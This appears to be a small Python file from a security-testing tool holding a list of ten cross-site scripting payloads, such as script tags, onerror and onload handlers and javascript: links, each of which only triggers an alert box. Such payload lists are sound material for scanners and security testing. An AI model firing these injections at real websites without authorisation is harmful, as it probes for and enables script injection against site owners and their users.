# payloads.py

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "';alert(String.fromCharCode(88,83,83))//",
    "<svg onload=alert(1)>",
    "<body onload=alert('XSS')>",
    "<div onmouseover=alert('XSS')>Hover here!</div>",
    "<input autofocus onfocus=alert('XSS')>",
    "<details open ontoggle=alert('XSS')>",
    "<iframe srcdoc=\"<script>alert('XSS')</script>\">",
    "<a href=\"javascript:alert('XSS')\">Click Me</a>",
    # Add more payloads for better coverage
    # E.g., HTML entity encoded, URL encoded, different tags, etc.
]